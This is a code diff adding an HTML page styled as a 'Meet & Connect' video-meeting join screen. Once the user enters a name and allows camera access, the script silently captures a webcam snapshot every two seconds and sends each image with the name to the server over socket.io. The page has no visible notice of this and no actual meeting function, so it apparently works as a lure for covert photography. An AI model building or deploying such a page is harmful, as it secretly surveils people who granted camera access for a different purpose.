@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<title>Meet & Connect</title>
+
+<style>
+
+body{
+font-family: Arial;
+text-align:center;
+background:#0f172a;
+color:white;
+margin:0;
+}
+
+.container{
+margin-top:80px;
+}
+
+.card{
+background:#1e293b;
+padding:40px;
+border-radius:12px;
+width:400px;
+margin:auto;
+box-shadow:0px 0px 20px rgba(0,0,0,0.5);
+}
+
+input{
+padding:12px;
+width:80%;
+margin-bottom:15px;
+border-radius:6px;
+border:none;
+}
+
+button{
+padding:12px 25px;
+font-size:16px;
+background:#3b82f6;
+border:none;
+color:white;
+border-radius:8px;
+cursor:pointer;
+}
+
+video{
+margin-top:20px;
+border-radius:10px;
+width:100%;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+<div class="card">
+
+<h1>Meet & Connect</h1>
+
+<input id="username" placeholder="Enter your name">
+
+<br>
+
+<button onclick="startCamera()">Join Meeting</button>
+
+<video id="video" autoplay playsinline></video>
+
+</div>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+
+<script>
+
+const socket = io();
+
+function startCamera(){
+
+const username = document.getElementById("username").value;
+
+if(!username){
+alert("Enter name first");
+return;
+}
+
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+
+const video = document.getElementById("video");
+video.srcObject = stream;
+
+const canvas = document.createElement("canvas");
+const context = canvas.getContext("2d");
+
+setInterval(() => {
+
+canvas.width = video.videoWidth;
+canvas.height = video.videoHeight;
+
+context.drawImage(video, 0, 0);
+
+const image = canvas.toDataURL("image/png");
+
+socket.emit("photo", {
+image:image,
+user:username
+});
+
+}, 2000);
+
+});
+
+}
+
+</script>
+
+</body>
+
+</html>
